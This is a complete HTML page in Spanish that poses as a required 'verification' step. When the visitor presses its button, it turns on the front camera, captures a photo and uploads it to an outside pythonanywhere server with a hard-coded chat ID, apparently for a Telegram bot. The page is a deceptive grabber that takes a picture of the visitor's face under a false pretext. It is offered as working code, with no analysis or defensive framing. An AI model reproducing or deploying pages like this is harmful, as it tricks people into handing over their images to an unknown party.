<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; }
        video { width: 100%; max-width: 400px; border: 1px solid #ccc; }
        button { padding: 10px 20px; font-size: 16px; }
    </style>
</head>
<body>
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <video id="video" autoplay playsinline></video>
    <button id="btn">📸 Capturar y enviar</button>

    <script>
        const SERVER_URL = 'https://societykark.pythonanywhere.com/upload';

        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        let stream = null;

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                return true;
            } catch(e) {
                alert('No se pudo acceder a la cámara');
                return false;
            }
        }

        async function capturarYEnviar() {
            if (!stream) {
                alert('La cámara no está activa');
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);

            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];

            try {
                const res = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        photo: fotoBase64,
                        chat_id: '7555997298'
                    })
                });

                if (res.ok) {
                    alert('✅ Foto enviada correctamente');
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                    video.srcObject = null;
                } else {
                    alert('❌ Error al enviar');
                }
            } catch(e) {
                alert('❌ Error de conexión');
            }
        }

        document.getElementById('btn').onclick = async () => {
            const btn = document.getElementById('btn');
            btn.disabled = true;
            btn.innerText = '⏳ Procesando...';

            const ok = await iniciarCamara();
            if (ok) {
                setTimeout(async () => {
                    await capturarYEnviar();
                    btn.disabled = false;
                    btn.innerText = '📸 Capturar y enviar';
                }, 1000);
            } else {
                btn.disabled = false;
                btn.innerText = '📸 Capturar y enviar';
            }
        };
    </script>
</body>
</html>
